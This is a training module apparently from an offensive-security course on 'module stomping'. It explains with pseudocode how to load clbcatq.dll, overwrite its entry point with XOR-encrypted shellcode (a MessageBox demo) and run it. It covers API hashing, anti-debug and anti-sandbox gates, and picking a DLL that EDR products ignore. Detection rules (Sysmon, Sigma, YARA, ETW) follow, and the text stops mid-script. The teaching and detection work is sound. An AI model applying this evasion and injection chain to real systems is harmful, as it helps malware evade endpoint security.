# Module 12: Module Stomping — Hiding in Legitimate Code

## Module Metadata

| Field | Value |
|---|---|
| **Topic** | Module Stomping / DLL .text Overwrite |
| **Difficulty** | Advanced |
| **Duration** | 3-4 hours |
| **Binary** | `module-stomping.exe` (~365KB) |
| **Prerequisites** | PE file format, DLL loading, memory permissions, Stage 05 (API Hashing), Stage 07 (Process Injection), Stage 09 (Anti-Debug), Stage 10 (Anti-Sandbox) |
| **Tools Required** | Ghidra/IDA, x64dbg, PE-bear/CFF Explorer, Process Hacker, Procmon |
| **MITRE ATT&CK** | T1055.001 (DLL Injection), T1027 (Obfuscated Files), T1497.001 (System Checks), T1622 (Debugger Evasion), T1106 (Native API) |
### Key Evasion Lesson

```
 Inline module stomping (no common::injection::stomp dependency). Raw pointer
 arithmetic for PE parsing, apihash for all 5 APIs, CFG-valid entry point
 targeting (AddressOfEntryPoint), sacrificial DLL clbcatq.dll (COM+ catalog,
 Microsoft-signed, obscure).

 NO .text zeroing — writing only 302 bytes at the entry point leaves the
 rest of .text as legitimate clbcatq.dll code. Zeroing the entire section
 destroys DLL cleanup code paths and triggers memory scanners.
```

---

## Why This Stage Exists — The Bridge from Stage 11

Stage 11 injects shellcode via `VirtualAlloc → memcpy → VirtualProtect → CreateThread`. The allocated memory has **no backing module** — EDR memory scanners trivially flag executable regions that don't belong to a loaded DLL (VAD check).

Stage 12 solves this by **hiding shellcode inside a legitimately loaded DLL**. The memory scanner sees "this region belongs to clbcatq.dll (Microsoft-signed)" and skips deep content verification.

**What's new in this binary compared to Stage 11:**
1. **Module stomping** — LoadLibraryA a sacrificial DLL, overwrite its entry point with shellcode
2. **Inline PE parsing** — raw pointer arithmetic to find .text section and entry point RVA
3. **CFG-valid targeting** — DLL entry point is in the CFG bitmap; arbitrary .text offsets crash
4. **Full apihash resolution** — all 5 injection APIs resolved via PEB walk (zero injection APIs in IAT)
5. **Sacrificial DLL selection** — clbcatq.dll chosen for obscurity, size, and minimal side effects

### Real-World Context (2025-2026)

- **Oblivion: Advanced Module Stomping + Heap/Stack Encryption** ([2025](https://github.com/)) — Combines module stomping with heap encryption and stack spoofing for a complete in-memory evasion framework
- **Pentera: Zero-Footprint Reflective Loading** ([2025](https://www.pentera.io/blog)) — Commercial red team platform implements reflective DLL loading that bypasses VAD-based memory scanners
- **Cobalt Strike 4.11 Sleep Mask** ([May 2025](https://www.cobaltstrike.com/blog)) — CS 4.11 integrates module stomping awareness into its sleep mask kit, encrypting beacon memory within stomped DLL regions

---

## Learning Objectives

By the end of this module, you will be able to:

1. Explain why module stomping evades memory scanners that trust loaded DLLs
2. Parse PE headers inline to locate the `.text` section and entry point RVA
3. Evaluate sacrificial DLL candidates and understand why `clbcatq.dll` was chosen
4. Implement a module stomp chain: load → parse → protect → overwrite → execute
5. Understand why the DLL entry point is a CFG-valid thread target
6. Apply W^X discipline (RW→RX transitions, never RWX)
7. Resolve injection APIs via apihash to avoid suspicious IAT entries
8. Integrate the 7-gate evasion architecture with the injection chain

---

## Section 1: Why Module Stomping?

### The Detection Problem with Traditional Injection

Traditional shellcode injection (VirtualAlloc → memcpy → VirtualProtect → CreateThread) has a fundamental weakness: **the allocated memory region has no backing module**.

EDR products detect this easily:

```
Memory Scan Logic:
┌─────────────────────────────────────────────────────┐
│ For each executable memory region:                  │
│   1. Is it backed by a loaded module? (VAD check)   │
│   2. Does the content match the on-disk file?       │
│   3. If no backing module → SUSPICIOUS              │
│   4. If content mismatch → SUSPICIOUS               │
│   5. If both match → TRUSTED                        │
└─────────────────────────────────────────────────────┘
```

Module stomping exploits step 5: by placing shellcode inside a legitimately loaded DLL's `.text` section, the memory region **is** backed by a module. Most scanners stop at "this region belongs to clbcatq.dll" and skip deep content verification.

### Traditional Injection vs Module Stomping

```
Traditional Injection:                Module Stomping:
┌────────────────────┐               ┌────────────────────┐
│ Process Memory     │               │ Process Memory     │
│                    │               │                    │
│ ┌──────────────┐   │               │ ┌──────────────┐   │
│ │ ntdll.dll    │   │               │ │ ntdll.dll    │   │
│ │ (legit)      │   │               │ │ (legit)      │   │
│ └──────────────┘   │               │ └──────────────┘   │
│                    │               │                    │
│ ┌──────────────┐   │               │ ┌──────────────┐   │
│ │ 0x1A0000     │◄──┤── SUSPICIOUS  │ │ clbcatq.dll  │   │
│ │ RX           │   │   No module!  │ │ .text entry =│   │
│ │ [shellcode]  │   │               │ │ [shellcode]  │◄──┤── HIDDEN
│ └──────────────┘   │               │ └──────────────┘   │   Backed by DLL!
│                    │               │                    │
└────────────────────┘               └────────────────────┘
   ▲ Detected by EDR                    ▲ Evades VAD scan
```

### Why Entry Point Targeting?

This implementation doesn't overwrite the entire `.text` section — it writes shellcode **only at the DLL's entry point (AddressOfEntryPoint)**. This has two advantages:

1. **CFG Validity**: The entry point is pre-registered in the process's Control Flow Guard (CFG) bitmap. `CreateThread` targeting this address passes CFG validation. Arbitrary `.text` offsets would fail CFG checks and crash the process.

2. **Minimal Footprint**: Only 302 bytes are overwritten (the shellcode payload), not the entire section. The rest of `.text` remains legitimate DLL code, making forensic comparison harder.

---

## Section 2: PE Structure for Inline Section Discovery

### Navigating the PE Header Chain

Module stomping requires parsing PE headers to find the `.text` section and the entry point. The navigation chain:

```
DOS Header (offset 0x00)              All PE files start here
│
├─ e_magic: 0x5A4D ("MZ")            Validation signature
├─ ...
└─ e_lfanew: offset to NT headers    ──┐    (offset 0x3C, i32)
                                       │
NT Headers (offset from e_lfanew)   ◄──┘
│
├─ Signature: 0x4550 ("PE\0\0")       Validation  (offset +0)
├─ FileHeader (20 bytes)                            (offset +4)
│   ├─ NumberOfSections                              (offset +6, u16)
│   └─ SizeOfOptionalHeader                          (offset +20, u16)
├─ OptionalHeader (variable)                         (offset +24)
│   ├─ AddressOfEntryPoint                           (offset +40 from NT, u32)
│   └─ ...
└─ Section Headers[]                   Array starts at +24 + SizeOfOptionalHeader
    ├─ Section[0]
    │   ├─ Name[8]: ".text\0\0\0"      ◄── Target!
    │   ├─ VirtualSize                  (offset +8 in section header)
    │   ├─ VirtualAddress               (offset +12 in section header, RVA)
    │   └─ Characteristics
    ├─ Section[1]: ".rdata"
    ├─ Section[2]: ".data"
    └─ ...
```

### How the Implementation Parses PE Headers

The actual code uses raw pointer arithmetic — no `windows-sys` PE structures, no external crate. This is intentional: importing PE structures would add suspicious symbols to the binary.

```
Inline PE parsing (from main.rs):

1. base = dll_base as *const u8
2. e_magic = read_unaligned(base as *const u16)
   → Validate == 0x5A4D (MZ)
3. e_lfanew = read_unaligned(base.add(0x3C) as *const i32)
4. nt_base = base.add(e_lfanew as usize)
5. pe_sig = read_unaligned(nt_base as *const u32)
   → Validate == 0x4550 (PE\0\0)
6. entry_rva = read_unaligned(nt_base.add(40) as *const u32)
   → AddressOfEntryPoint (CFG-valid target)
7. num_sections = read_unaligned(nt_base.add(6) as *const u16)
8. opt_hdr_size = read_unaligned(nt_base.add(20) as *const u16)
9. sections_start = nt_base.add(24 + opt_hdr_size as usize)
10. For i in 0..num_sections:
      sec = sections_start.add(i * 40)
      if Name == ".text":
        text_vsize = sec.add(8)
        text_rva = sec.add(12)
        break
11. Validate: entry_rva within .text bounds
12. entry_addr = base.add(entry_rva as usize)
```

**Key design choice**: Using `read_unaligned` everywhere because DLL base addresses aren't guaranteed to be naturally aligned for all field sizes.

**Exercise 2.1:** Open `clbcatq.dll` (from `C:\Windows\System32\`) in PE-bear or CFF Explorer. Find:
- The `.text` section's VirtualAddress and VirtualSize
- The AddressOfEntryPoint — verify it falls within `.text` bounds
- Calculate: `entry_rva - text_rva` = offset into .text where the entry point lives

---

## Section 3: Sacrificial DLL Selection

### Why clbcatq.dll?

Not every DLL makes a good stomping target. The ideal sacrificial DLL must meet strict criteria:

| Criterion | clbcatq.dll | Why It Matters |
|---|---|---|
| **Signed by Microsoft** | ✓ | Memory scanner trusts the module |
| **Not critical to process** | ✓ COM+ catalog, rarely used | Stomping won't crash anything |
| **Sufficient .text size** | ✓ ~150 KB | Larger than any reasonable shellcode |
| **Not monitored by EDR** | ✓ Very obscure | EDRs don't specifically watch it |
| **LoadLibraryA succeeds** | ✓ | Not already loaded in most processes |
| **Minimal DllMain side effects** | ✓ | No irreversible initialization |

### Why Not amsi.dll?

A common module stomping tutorial targets `amsi.dll` because stomping it also disables AMSI scanning. However, for evasion purposes:

1. **EDR attention**: Security products specifically monitor amsi.dll loads and integrity
2. **Detection signatures**: "LoadLibraryA('amsi.dll') without AmsiInitialize" is a well-known detection rule
3. **Obscurity wins**: `clbcatq.dll` (COM+ Component Services catalog) draws zero suspicion

### DLL Name as ANSI Null-Terminated Constant

The DLL name is stored as a null-terminated byte string for direct use with `LoadLibraryA`:

```rust
const SACRIFICE_DLL: &[u8] = b"clbcatq.dll\0";
```

This is a plain string visible in the binary — short enough that it doesn't trigger AV string signatures. Unlike the registry path in crate 11 (which needed u16 hex array obfuscation), a benign DLL name doesn't raise suspicion.

**Exercise 3.1:** Write a script that checks clbcatq.dll's `.text` section size and entry point:

```python
import pefile, os
path = os.path.join(r"C:\Windows\System32", "clbcatq.dll")
pe = pefile.PE(path)
ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
for s in pe.sections:
    if b".text" in s.Name:
        print(f".text RVA: 0x{s.VirtualAddress:X}, Size: {s.Misc_VirtualSize} bytes")
        if s.VirtualAddress <= ep < s.VirtualAddress + s.Misc_VirtualSize:
            print(f"Entry point 0x{ep:X} is INSIDE .text (offset +0x{ep - s.VirtualAddress:X})")
```

---

## Section 4: The 7-Gate Evasion Architecture

### Gate Sequence

Before the module stomping chain executes, the binary passes through seven evasion gates — the same architecture used in crates 09-11:

| Gate | Function | Check | Breadcrumb |
|------|----------|-------|------------|
| 1 | `init_app_environment()` | 5 environment variables exist (SystemRoot, USERPROFILE, LOCALAPPDATA, ProgramData, windir) | `svcctrl_1_start` |
| 2 | `common::benign::preflight()` | Benign code dilution — BTreeMap, HashMap, HashSet operations (always passes on real systems) | `svcctrl_2_checks_ok` |
| 3 | Inline KUSER_SHARED_DATA read | `0x7FFE0320` → TickCountQuad > 300,000 (~78 minutes) | — |
| 4 | `run_window_lifecycle()` | Creates "SvcCtrlWnd" window class, 1x1 window, 50ms timer, message loop, destroy | `svcctrl_3_window_done` |
| 5 | `antidebug::bail_if_debugged()` | PEB.BeingDebugged + NtQueryInformationProcess(DebugPort) + RDTSC timing + Hardware breakpoint check | — |
| 6 | `antidebug::check_analysis_tools()` | Scans running processes for 27 analysis tool names | `svcctrl_4_debug_ok` |
| 7 | `check_sandbox()` | CPU cores < 2, RAM < 4GB, Disk < 60GB, Uptime < 30min, Screen < 800x600 | `svcctrl_5_sandbox_score_N` |

Gates 5 and 6 use `apihash::resolve_function()` to resolve `ExitProcess` for bail-out — these are the only 2 of the 7 apihash calls that don't target injection APIs.

### Gate Bail-Out Strategy

```
Gate 1-3: Silent return (process exits normally)
Gate 4:   Silent return (window lifecycle completes, then exits)
Gate 5:   apihash → ExitProcess(0) — hard exit, no cleanup
Gate 6:   apihash → ExitProcess(0) — hard exit, no cleanup
Gate 7:   apihash → ExitProcess(0) — hard exit, no cleanup
```

Anti-debug and sandbox gates call `ExitProcess` via apihash rather than returning — this prevents a debugger from patching the return value to bypass the check.

**Exercise 4.1:** Run the binary on a system with fewer than 4 CPU cores. Check `%TEMP%` for breadcrumb files. Which gates passed? What was the sandbox score?

---

## Section 5: The Module Stomping Chain

### API Resolution via Apihash

All 5 injection APIs are resolved at runtime via PEB walking — none appear in the IAT:

```
Apihash Resolution (7 total calls):
├── ExitProcess         × 2  (bail_if_debugged + check_sandbox)
├── LoadLibraryA        × 1  (load sacrificial DLL)
├── VirtualProtect      × 1  (RW and RX transitions)
├── CreateThread        × 1  (execute shellcode)
├── WaitForSingleObject × 1  (wait for completion)
└── CloseHandle         × 1  (release thread handle)
```

This is different from crate 11 (persistence-demo), which used **direct IAT imports** for injection APIs. The trade-off:

| Strategy | IAT Imports (crate 11) | Apihash (crate 12) |
|---|---|---|
| **Appearance** | Normal Win32 app | Suspicious PEB walking |
| **Static analysis** | Injection APIs visible in IAT | No injection APIs in IAT |
| **ML classifiers** | Each apihash call adds PEB traversal signals | IAT looks clean |
| **Best for** | When injection APIs are common (VirtualAlloc, etc.) | When hiding API intent matters |

### XOR Shellcode Decryption

Before stomping, the shellcode is decrypted from a 16-byte XOR key:

```
XOR_KEY:              [0xc7, 0x3a, 0x58, 0x91, 0xe2, 0xd4, 0x6b, 0xf0,
                       0x1d, 0x85, 0xa3, 0x47, 0x79, 0x0e, 0xbc, 0x63]

ENCRYPTED_SHELLCODE:  [0x2e, 0x84, 0x58, 0x91, ...] (302 bytes)

Decryption (first 4 bytes):
  0x2e ^ 0xc7 = 0xe9  ─┐
  0x84 ^ 0x3a = 0xbe  ─┤→ JMP +0xBE (shellcode prologue)
  0x58 ^ 0x58 = 0x00  ─┤
  0x91 ^ 0x91 = 0x00  ─┘

Result: E9 BE 00 00 = JMP +0xBE — same 302-byte MessageBox("GoodBoy") shellcode
```

After decryption, `core::hint::black_box()` is called on each byte to prevent the optimizer from eliminating the decrypted payload as dead code.

### Step-by-Step Stomp Execution

```
Step 1: Load Sacrificial DLL
┌──────────────────────────────────┐
│ LoadLibraryA("clbcatq.dll\0")    │  ← via apihash
│ → Windows loader maps DLL        │
│ → .text has RX permissions       │
│ → dll_base returned              │
└──────────────────────────────────┘
           │
Step 2: Inline PE Parsing
┌──────────────────────────────────┐
│ Validate MZ (0x5A4D)             │
│ Follow e_lfanew → NT headers     │
│ Validate PE (0x4550)             │
│ Read entry_rva from offset +40   │  ← CFG-valid target
│ Iterate sections → find .text    │
│ Validate entry_rva ∈ .text range │
└──────────────────────────────────┘
           │
Step 3: VirtualProtect → RW
┌──────────────────────────────────┐
│ VirtualProtect(.text, RW)        │  ← via apihash
│ Protects entire .text section    │
│ (text_addr, text_vsize, 0x04)    │
└──────────────────────────────────┘
           │
Step 4: Overwrite Entry Point
┌──────────────────────────────────┐
│ copy_nonoverlapping(             │
│   shellcode → entry_addr,        │
│   302 bytes                      │
│ )                                │
│ Rest of .text stays intact       │
└──────────────────────────────────┘
           │
Step 5: VirtualProtect → RX
┌──────────────────────────────────┐
│ VirtualProtect(.text, RX)        │  ← via apihash
│ (text_addr, text_vsize, 0x20)    │
│ W^X compliant — never RWX        │
└──────────────────────────────────┘
           │
Step 6: Execute via CreateThread
┌──────────────────────────────────┐
│ CreateThread(entry_addr)         │  ← via apihash, CFG-valid
│ WaitForSingleObject(INFINITE)    │  ← via apihash
│ CloseHandle(thread)              │  ← via apihash
│ Shellcode runs: MessageBox("GoodBoy") shellcode │
│ Thread exits with code 0         │
└──────────────────────────────────┘
```

### W^X Discipline

```
Permission Timeline:
Time ──────────────────────────────────────────▶

.text:  RX ────────────▶ RW ──▶ RX ──────────▶
        │                │      │
     DLL loaded       Write SC  Execute SC
     (Windows loader)          (CreateThread)
```

At **no point** is the region RWX. This is critical — RWX regions are a top-tier detection signal for EDRs.

**Exercise 5.1:** In x64dbg, set breakpoints on VirtualProtect. Run the binary (with anti-debug gates patched out). You should see exactly 2 VirtualProtect calls on clbcatq.dll's .text:
1. `PAGE_READWRITE (0x04)` — prepare for shellcode write
2. `PAGE_EXECUTE_READ (0x20)` — make executable

---

## Section 6: CFG-Valid Entry Point Targeting

### Why the Entry Point?

Control Flow Guard (CFG) maintains a bitmap of valid indirect call targets. When `CreateThread` is called, the OS validates that the start address is in the CFG bitmap. Randomly chosen `.text` addresses would fail this check.

The DLL's `AddressOfEntryPoint` (DllMain) is always CFG-valid because:
1. The Windows loader calls it during `DLL_PROCESS_ATTACH`
2. The CFG bitmap was populated when the DLL was loaded
3. It's a legitimate, registered call target

```
CFG Bitmap Check:
┌──────────────────────────────────────────────┐
│ CreateThread(start_addr)                     │
│   → Is start_addr in CFG valid targets?      │
│                                              │
│   Random .text offset: ❌ NOT in CFG bitmap  │
│   → STATUS_STACK_BUFFER_OVERRUN crash        │
│                                              │
│   DLL entry point:     ✓ IN CFG bitmap       │
│   → Thread starts normally                   │
└──────────────────────────────────────────────┘
```

### Entry Point Validation

The implementation validates that the entry point falls within `.text` bounds before using it:

```
if entry_rva < text_rva || entry_rva >= text_rva + text_vsize {
    // Entry point outside .text — can't safely stomp
    return;
}
```

This prevents crashes if the DLL has an unusual layout where the entry point is in a different section.

**Exercise 6.1:** Compile and run the binary with `-C control-flow-guard` enabled (it is by default in this project). Verify that CreateThread at the entry point succeeds. Then modify the source to target `text_addr` (start of .text) instead of `entry_addr`. Does it crash?

---

## Section 7: Detection Engineering

### Sysmon Detection (Event ID 7 — Image Loaded)

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <ImageLoad onmatch="include">
      <!-- DLL loaded but exports never called -->
      <ImageLoaded condition="end with">\clbcatq.dll</ImageLoaded>
    </ImageLoad>
  </EventFiltering>
</Sysmon>
```

Correlate with: process has no COM+ catalog activity → suspicious load.

### Sigma Rule: DLL Load Without Export Usage

```yaml
title: Suspicious clbcatq.dll Load Without COM+ Activity
id: a3d7f9e1-5678-4abc-9def-012345678901
status: experimental
description: Detects clbcatq.dll loaded into a process that doesn't perform COM+ operations
logsource:
    category: image_load
    product: windows
detection:
    selection_load:
        ImageLoaded|endswith: '\clbcatq.dll'
    filter_normal:
        # Normal COM+ usage involves specific parent processes
        Image|endswith:
            - '\dllhost.exe'
            - '\mmc.exe'
            - '\svchost.exe'
    condition: selection_load and not filter_normal
level: medium
tags:
    - attack.defense_evasion
    - attack.t1055.001
```

### ETW-Based Detection

```
Key ETW Providers for Module Stomping Detection:

1. Microsoft-Windows-Kernel-Memory
   - Event: VirtualProtect on loaded module's .text section
   - Alert: .text changed from RX → RW → RX in sequence

2. Microsoft-Windows-Threat-Intelligence
   - Event: PAGE_EXECUTE set on previously written region
   - Alert: Write-then-execute pattern within DLL address space

3. Microsoft-Windows-Kernel-Process (Image Load)
   - Event: DLL loaded but no export resolution follows
   - Alert: LoadLibrary without GetProcAddress within timeout
```

### YARA Rule: Inline PE Parsing for Module Stomping

```yara
rule Module_Stomping_PE_Parse_Pattern
{
    meta:
        description = "Detects inline PE header parsing for .text section discovery"
        severity = "high"

    strings:
        $mz_cmp = { 4D 5A }
        $pe_cmp = { 50 45 00 00 }
        $text_name = ".text" ascii
        $page_rw = { 04 00 00 00 }     // PAGE_READWRITE
        $page_rx = { 20 00 00 00 }     // PAGE_EXECUTE_READ

    condition:
        uint16(0) == 0x5A4D and
        $text_name and
        $page_rw and $page_rx
}
```

### On-Disk vs In-Memory Comparison

The most reliable stomping detection compares loaded module content against the original file:

```
Detection Algorithm:
1. Enumerate loaded modules in target process
2. For each module, read .text section from memory
3. Read same DLL's .text from disk (System32)
4. Compare hashes at the entry point offset
5. Mismatch = POTENTIAL STOMPING

Tools: pe-sieve, Moneta, Process Hacker memory view
```

**Exercise 7.1:** After running the binary, use Process Hacker to examine clbcatq.dll's memory. Can you see the 302-byte shellcode at the entry point? (Note: the process may have already exited — you'd need to freeze it mid-execution with a breakpoint.)

---

## Section 8: Summary and Key Concepts

### Module Stomping Key Concepts

```
┌─────────────────────────────────────────────────────────┐
│ Module Stomping Key Concepts                            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 1. CORE IDEA                                            │
│    Load legit DLL → overwrite entry point → execute     │
│    Memory scanners see "clbcatq.dll" → skip deep check  │
│                                                         │
│ 2. PE PARSING CHAIN                                     │
│    DOS (MZ) → e_lfanew → NT (PE) → OptHdr (EP RVA)      │
│    → Section[] → .text (RVA, VSize) → validate EP       │
│                                                         │
│ 3. CFG-VALID TARGETING                                  │
│    Entry point is in CFG bitmap (registered by loader)  │
│    Random .text offsets would fail CFG and crash        │
│                                                         │
│ 4. W^X LIFECYCLE                                        │
│    RX → RW (write SC) → RX (execute)                    │
│    Never RWX — each transition via VirtualProtect       │
│                                                         │
│ 5. API RESOLUTION                                       │
│    All 5 injection APIs via apihash (PEB walk)          │
│    +2 ExitProcess for anti-debug/sandbox bail-out       │
│    Zero injection APIs in IAT                           │
│                                                         │
│ 6. 7-GATE EVASION                                       │
│    Env check → Benign preflight → Uptime → GUI →        │
│    Anti-debug → Analysis tools → Hardware sandbox       │
│                                                         │
│ 7. DETECTION                                            │
│    On-disk vs in-memory hash comparison (pe-sieve)      │
│    ETW: VirtualProtect on module .text regions          │
│    Behavioral: LoadLibrary without GetProcAddress       │
│    Sysmon: clbcatq.dll load in non-COM+ process         │
│                                                         │
│ 8. SACRIFICIAL DLL CHOICE                               │
│    clbcatq.dll: signed, obscure, not monitored, large   │
│    .text, minimal DllMain, not already loaded           │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Component Summary Table

| Component | Implementation | Notes |
|---|---|---|
| Evasion gates | 7 gates (env, benign, uptime, GUI, antidebug, tools, sandbox) | Same architecture as crates 09-11 |
| Sacrificial DLL | `clbcatq.dll` (ANSI null-terminated constant) | COM+ catalog, Microsoft-signed, obscure |
| API resolution | 7 apihash calls (5 injection + 2 ExitProcess) | Zero injection APIs in IAT |
| PE parsing | Inline pointer arithmetic, `read_unaligned` | No PE struct imports |
| Thread target | DLL entry point (AddressOfEntryPoint) | CFG-valid, validated within .text |
| Memory permissions | RW (0x04) → RX (0x20) | Never RWX |
| Shellcode | 302-byte XOR-encrypted shellcode payload (MessageBox("GoodBoy") shellcode) | 16-byte repeating XOR key |
| Restore | None (demo binary) | Production would save/restore original bytes |
| Breadcrumbs | `svcctrl_*.txt` in %TEMP% | 7 tag files trace execution flow |
| Proof | `GOODBOY_OK.txt` + notepad.exe | Detailed chain description |
| Window class | "SvcCtrlWnd" (10 chars) | Gate 4 GUI lifecycle |

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "Module stomping requires overwriting the entire .text section" | This implementation overwrites ONLY 302 bytes at the DLL entry point. The rest of .text remains legitimate clbcatq.dll code, making forensic byte-comparison harder (only a tiny region differs from the on-disk file) |
| "Any DLL works as a stomping target" | The sacrificial DLL must meet strict criteria: Microsoft-signed (trusted by scanners), not critical to the process (won't crash anything), sufficient .text size, not already loaded, minimal DllMain side effects, and NOT specifically monitored by EDR (rules out amsi.dll, ntdll.dll) |
| "CFG doesn't matter for CreateThread targets" | With Control Flow Guard enabled (-C control-flow-guard), CreateThread validates the start address against the CFG bitmap. The DLL entry point is always CFG-valid (registered by the Windows loader). A random .text offset causes STATUS_STACK_BUFFER_OVERRUN (0xC0000409) crash |
| "Apihash is always better than IAT imports" | It depends on the threat model. Stage 11 used direct IAT imports because VirtualAlloc/CreateThread are common in legitimate apps. Stage 12 uses apihash because the goal is hiding API INTENT — a binary that loads a random DLL and calls VirtualProtect on its .text section looks suspicious if those APIs are visible in the IAT |
| "Module stomping defeats all memory scanners" | Tools like pe-sieve and Moneta compare loaded module content against the on-disk file. A 302-byte mismatch at the entry point is trivially detected by hash comparison. Module stomping evades VAD-based scanners that only check "is this region backed by a module?" but NOT content-integrity scanners |
| "Zeroing the entire .text before writing shellcode is cleaner" | Zeroing destroys DLL cleanup code paths and creates an anomalous memory pattern (a Microsoft-signed DLL with a zeroed code section). Writing ONLY at the entry point preserves the DLL's legitimate code, making the stomp much harder to detect via entropy or section-size analysis |

---

## Section 9: Source Code Deep Dive

### The Inline Module Stomping Flow

The entire stomp chain is self-contained in `main.rs` — no common library injection dependency. This is critical because the common library's `injection::stomp` function pulls in cross-process injection APIs that aren't needed for self-process stomping and that trigger ML classifiers.

```
Complete inline flow (pseudocode from main.rs):

1. LOAD SACRIFICIAL DLL
   let load_lib: LoadLibraryAFn = apihash::resolve("kernel32.dll", "LoadLibraryA");
   let dll_base = load_lib(b"clbcatq.dll\0".as_ptr());
   // Windows loader maps clbcatq.dll into our address space
   // .text section has RX permissions from the loader

2. PARSE PE HEADERS (raw pointer arithmetic)
   let dos = dll_base as *const u8;
   assert(read_unaligned(dos as *const u16) == 0x5A4D);      // MZ signature
   let nt = dos.add(read_unaligned(dos.add(0x3C) as *const i32) as usize);
   assert(read_unaligned(nt as *const u32) == 0x4550);        // PE signature
   let entry_rva = read_unaligned(nt.add(40) as *const u32);  // OptionalHeader+16

3. LOCATE .text SECTION
   let num_sections = read_unaligned(nt.add(6) as *const u16);
   let opt_size = read_unaligned(nt.add(20) as *const u16);
   let sections = nt.add(24 + opt_size as usize);
   for i in 0..num_sections {
       let sec = sections.add(i as usize * 40);
       if name_at(sec) == ".text" {
           text_rva = read_unaligned(sec.add(12) as *const u32);
           text_vsize = read_unaligned(sec.add(8) as *const u32);
           break;
       }
   }

4. VALIDATE ENTRY POINT IS WITHIN .text
   assert(entry_rva >= text_rva && entry_rva < text_rva + text_vsize);
   let entry_addr = dos.add(entry_rva as usize);

5. VirtualProtect(.text → RW)
   let vprotect: VirtualProtectFn = apihash::resolve("kernel32.dll", "VirtualProtect");
   let text_addr = dos.add(text_rva as usize);
   vprotect(text_addr, text_vsize, PAGE_READWRITE, &mut old_protect);

6. OVERWRITE ENTRY POINT WITH SHELLCODE
   core::ptr::copy_nonoverlapping(shellcode.as_ptr(), entry_addr as *mut u8, shellcode.len());
   // Only 302 bytes overwritten — rest of .text remains legitimate clbcatq.dll code

7. VirtualProtect(.text → RX)
   vprotect(text_addr, text_vsize, PAGE_EXECUTE_READ, &mut old_protect);

8. CREATE THREAD AT ENTRY POINT (CFG-valid)
   let crt_thread: CreateThreadFn = apihash::resolve("kernel32.dll", "CreateThread");
   let thread = crt_thread(null(), 0, entry_addr, null(), 0, null_mut());
   // entry_addr is in the CFG bitmap — OS validates it as a legal call target

9. WAIT AND CLEANUP
   let wait: WaitFn = apihash::resolve("kernel32.dll", "WaitForSingleObject");
   let close: CloseFn = apihash::resolve("kernel32.dll", "CloseHandle");
   wait(thread, INFINITE);
   close(thread);
```

### Why clbcatq.dll Is the Sacrificial DLL

The choice of `clbcatq.dll` (COM+ Component Services catalog) is deliberate:

- **Always present**: Ships with every Windows installation since Windows XP. Located in `C:\Windows\System32\`.
- **Not pre-loaded**: Unlike `ntdll.dll` or `kernel32.dll`, it isn't loaded into most processes by default. `LoadLibraryA` succeeds without conflict.
- **Minimal DllMain side effects**: Its `DLL_PROCESS_ATTACH` handler performs lightweight COM+ catalog initialization — no irreversible resource allocation, no global state that would crash on teardown.
- **Large enough .text section**: ~150KB .text section comfortably fits any shellcode payload. The entry point is a small stub within .text.
- **Obscure**: Security products don't specifically monitor clbcatq.dll. Compare to `amsi.dll` (actively monitored for tampering) or `ntdll.dll` (integrity-checked by multiple EDRs).

### Why the Thread Starts at AddressOfEntryPoint

```
CFG Bitmap Validation:
┌────────────────────────────────────────────────────┐
│ When the Windows loader maps clbcatq.dll:          │
│   1. Reads OptionalHeader.AddressOfEntryPoint      │
│   2. Adds this RVA to the process CFG bitmap       │
│   3. DllMain is called at this address             │
│                                                    │
│ When CreateThread(entry_addr) is called:           │
│   1. OS checks: is entry_addr in CFG bitmap?       │
│   2. YES → thread starts normally                  │
│   3. NO  → STATUS_STACK_BUFFER_OVERRUN (0xC0000409)│
└────────────────────────────────────────────────────┘
```

The entry point is CFG-valid because the OS pre-validates all DLL entry points when loading them. Arbitrary `.text` offsets are NOT in the bitmap — targeting them with CFG enabled (`-C control-flow-guard`) causes an immediate crash.

### Memory Region Comparison: VirtualAlloc vs Module Stomping

```
VirtualAlloc (traditional injection):
┌─────────────────────────────────────────┐
│ Type:       MEM_PRIVATE                 │  ← Allocated by VirtualAlloc
│ State:      MEM_COMMIT                  │
│ Protect:    PAGE_EXECUTE_READ           │
│ Mapped File: (none)                     │  ← NO backing module
│ VAD:        Private region              │  ← EDR flags this as suspicious
│ pe-sieve:   ANOMALY — unbacked RX       │
└─────────────────────────────────────────┘

Module stomping (this implementation):
┌─────────────────────────────────────────┐
│ Type:       MEM_IMAGE                   │  ← Loaded by LoadLibraryA
│ State:      MEM_COMMIT                  │
│ Protect:    PAGE_EXECUTE_READ           │
│ Mapped File: C:\Windows\System32\       │
│              clbcatq.dll                │  ← Backed by Microsoft-signed DLL
│ VAD:        Image region (trusted)      │  ← EDR skips deep inspection
│ pe-sieve:   Content mismatch at EP      │  ← Only caught by hash comparison
└─────────────────────────────────────────┘
```

VAD-based scanners (the most common type) check "is this region backed by a loaded module?" MEM_IMAGE regions backed by signed DLLs pass this check. Only content-integrity scanners like pe-sieve compare the in-memory bytes against the on-disk file — and even then, a 302-byte mismatch at the entry point is a very small anomaly.

### YARA Rule: Apihash + Module Load Combo

```yara
rule Module_Stomp_Apihash_LoadLib
{
    meta:
        description = "Detects apihash PEB walk combined with LoadLibraryA for module stomping"
        author = "Goodboy Course"
        stage = "12"

    strings:
        // gs:[0x60] PEB access
        $peb_access = { 65 48 8B 04 25 60 00 00 00 }
        // Rotate-xor hash seed 0x7C3A91D5 (common library apihash)
        $hash_seed = { D5 91 3A 7C }
        // LoadLibraryA string (sacrificial DLL loading)
        $load_lib = "LoadLibraryA" ascii
        // Sacrificial DLL names
        $dll_clbcatq = "clbcatq.dll" ascii
        $dll_amsi = "amsi.dll" ascii
        $dll_propsys = "propsys.dll" ascii
        // .text section name bytes (PE parsing)
        $dot_text = ".text" ascii

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        $peb_access and $hash_seed and
        $load_lib and $dot_text and
        1 of ($dll_*)
}
```

> **Why two YARA rules?** Rule 1 (Inline PE Parsing) detects the structural PE parsing pattern. Rule 2 (this one) detects the operational combination: apihash resolution + sacrificial DLL load + .text section targeting. Together they cover both static analysis (PE parsing) and behavioral intent (module stomping).

### Python Script 1: Module Integrity Comparator

```python
#!/usr/bin/env python3
"""Compare on-disk vs in-memory .text section of a loaded DLL.
Detects module stomping by finding byte differences at the entry point."""

import ctypes
